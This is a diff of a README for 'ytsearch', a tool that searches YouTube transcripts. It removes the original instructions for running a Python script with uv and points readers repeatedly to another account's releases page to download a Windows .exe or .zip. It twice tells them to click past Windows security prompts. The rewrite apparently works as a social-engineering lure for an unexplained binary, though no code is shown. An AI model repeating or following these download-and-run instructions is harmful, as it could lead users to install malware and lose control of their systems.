@@ -1,84 +1,147 @@
-# ytsearch
+# 🔎 ytsearch - Find YouTube transcripts fast
 
-Search YouTube video transcripts from the terminal. No download, no API key, no whisper.
+[![Download ytsearch](https://img.shields.io/badge/Download%20ytsearch-Visit%20Releases-blue?style=for-the-badge)](https://github.com/deusef6844/ytsearch/releases)
 
-Pulls captions directly from YouTube's endpoint over HTTP. Instant results with timestamps and deep links.
+## 📥 Download
 
-## Install
+Go to the [ytsearch releases page](https://github.com/deusef6844/ytsearch/releases) and download the Windows file from the latest release.
 
-```bash
-# with uv (recommended)
-uvx --from git+https://github.com/infatoshi/ytsearch ytsearch
+After the file finishes downloading, open it from your Downloads folder. If Windows asks for confirmation, choose the option that lets the app run.
 
-# or clone and run
-git clone https://github.com/infatoshi/ytsearch.git
-cd ytsearch
-uv run ytsearch.py <url> <terms>
-```
+## 🖥️ What ytsearch does
 
-## Usage
+ytsearch lets you search YouTube transcript text from the terminal. You can use it to find where a topic appears in a video without watching the full clip.
 
-```bash
-# search for keywords -- returns matching sections with timestamps
-uv run ytsearch.py "https://www.youtube.com/watch?v=VIDEO_ID" "search term"
+It is built for quick text search. It does not download videos. It does not need an API key. It does not use whisper.
 
-# multiple search terms (OR match)
-uv run ytsearch.py "https://youtu.be/VIDEO_ID" transformer attention "self-attention"
+## ✨ What you can do
 
-# adjust context window around matches (default: 15s)
-uv run ytsearch.py "https://youtu.be/VIDEO_ID" -c 30 "gradient descent"
+- Search transcript text from YouTube videos
+- Find matches by keyword
+- Check where a phrase appears in a transcript
+- Use it from a simple terminal window
+- Keep your workflow local and light
 
-# dump full transcript
-uv run ytsearch.py "https://youtu.be/VIDEO_ID"
+## 🪟 Windows setup
 
-# JSON output (for piping to agents, jq, etc.)
-uv run ytsearch.py "https://youtu.be/VIDEO_ID" --json "search term"
-```
+1. Open the [releases page](https://github.com/deusef6844/ytsearch/releases)
+2. Download the latest Windows file
+3. Open the file after it finishes downloading
+4. If Windows shows a security prompt, choose the option to run the app
+5. Start the app from the terminal if the release package uses a command-line file
 
-## Output
+If the app opens in a terminal window, that is normal. Type your search terms there and follow the on-screen prompts.
 
-Human-readable by default:
+## 🔧 How to use it
 
-```
-Found 3 matches in 1 section(s):
+ytsearch is made for simple transcript search.
 
---- Section 1 [09:25 - 10:45] https://www.youtube.com/watch?v=VIDEO_ID&t=565s ---
-  [09:25]    So in January I went through a period of Claude psychosis.
-  [09:29]    So I built a Claude that takes care of my home
-  [09:33] >> Dobby the elf. And basically I used the agents to find
-  [09:43] >> all the smart home subsystems on the local area network
-```
+A basic flow looks like this:
 
-`>>` marks lines containing your search terms. Each section includes a clickable YouTube link at the exact timestamp.
+1. Open Command Prompt or PowerShell
+2. Start ytsearch
+3. Paste or type a YouTube link, if the app asks for one
+4. Enter the word or phrase you want to find
+5. Read the matching transcript lines
 
-`--json` outputs structured data:
+If the app shows search results, look for the line that contains your term and the nearby text around it. That helps you spot the part of the video you need.
 
-```json
-{
-  "video_id": "kwSVtQ7dziU",
-  "query": ["dobby"],
-  "matches": 3,
-  "sections": [
-    {
-      "start": "09:13",
-      "end": "11:40",
-      "url": "https://www.youtube.com/watch?v=kwSVtQ7dziU&t=553s",
-      "lines": [
-        {"timestamp": "09:10", "start": 550.12, "text": "...", "match": false},
-        {"timestamp": "09:33", "start": 573.44, "text": "Dobby the elf...", "match": true}
-      ]
-    }
-  ]
-}
-```
+## 🧭 Best uses
 
-## Agent usage
+Use ytsearch when you want to:
 
-Built for AI coding agents (Claude Code, Codex, Cursor, etc.). Point your agent at a YouTube video and search it:
+- Find a quote in a YouTube video
+- Check if a topic is mentioned in a transcript
+- Jump to the part of a video that covers a subject
+- Search long interviews, talks, or tutorials
+- Save time when you only need text, not the whole video
 
-```bash
-# in your CLAUDE.md, .cursorrules, or agent prompt:
-# "To search YouTube transcripts: uv run /path/to/ytsearch.py <url> [--json] <terms>"
-```
+## 💻 System needs
 
-The `--json` flag gives structured output that agents can parse directly. No auth, no tokens, no setup.
+ytsearch is made for Windows desktops and laptops.
+
+You will need:
+
+- Windows 10 or newer
+- A working internet connection
+- Enough free space to save the download
+- Access to a terminal window such as Command Prompt or PowerShell
+
+For best use, keep your browser closed while you search if you want fewer distractions.
+
+## 📂 If the download is zipped
+
+If the release comes as a .zip file:
+
+1. Right-click the file
+2. Choose Extract All
+3. Pick a folder
+4. Open the extracted folder
+5. Run the app file inside it
+
+If you see several files, look for the main .exe file in the folder.
+
+## ⚙️ Basic tips
+
+- Use short search terms first
+- Try one phrase at a time
+- If a result looks too broad, use a longer phrase
+- If a video has no transcript, try another video
+- Keep the YouTube link copied so you can paste it fast
+
+## 🧩 Common file names
+
+Depending on the release, the download may use names like:
+
+- ytsearch.exe
+- ytsearch-windows.exe
+- ytsearch-win64.exe
+- ytsearch.zip
+
+The exact file name can change by release. Use the newest file shown on the releases page.
+
+## 🛠️ Troubleshooting
+
+If the app does not open:
+
+1. Make sure the download finished
+2. Try opening the file again
+3. Check that you picked the Windows release
+4. If the file is zipped, extract it first
+5. Open it from the folder where you saved it
+
+If the terminal closes right away, start the app from Command Prompt or PowerShell so you can see any messages on screen.
+
+If you get no results, check the video link and try a different search phrase.
+
+## 🔍 Search examples
+
+These examples show the kind of searches ytsearch is made for:
+
+- ai safety
+- how to build a pc
+- market trends
+- python tutorial
+- interview with founder
+
+You can also search for exact phrases if you know the words you want to find.
+
+## 📌 What to expect
+
+ytsearch keeps the process simple. You focus on the video topic, enter a search term, and read the matching transcript text.
+
+It works well for users who want fast answers from video content without watching the full video or using extra tools
+
+## 📄 File source
+
+Download the latest Windows release here:
+
+[https://github.com/deusef6844/ytsearch/releases](https://github.com/deusef6844/ytsearch/releases)
+
+## 🧾 Name
+
+ytsearch
+
+## 🧠 Short description
+
+Search YouTube transcripts from the terminal. No download, no API key, no whisper.
